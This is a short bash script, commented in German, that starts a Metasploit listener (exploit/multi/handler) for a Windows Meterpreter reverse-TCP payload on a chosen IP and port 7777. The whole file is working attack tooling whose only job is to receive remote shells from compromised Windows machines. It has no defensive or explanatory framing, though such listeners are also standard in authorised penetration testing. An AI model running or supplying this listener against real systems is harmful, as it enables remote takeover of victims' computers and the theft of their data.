#!/bin/bash

usage() {
  echo "Usage: $0 <Listen IP>"
  echo "  <Listen IP> - IP-Adresse für den Listener (z.B. deine lokale oder öffentliche IP)"
  exit 1
}

# Prüfen, ob exakt1 Argument übergeben wurden
if [ "$#" -ne 1 ]; then
  usage
fi

LHOST="$1"
LPORT="7777"

msfconsole -q -x "
use exploit/multi/handler;
set payload windows/meterpreter/reverse_tcp;
set lhost $LHOST;
set lport $LPORT;
run;
"
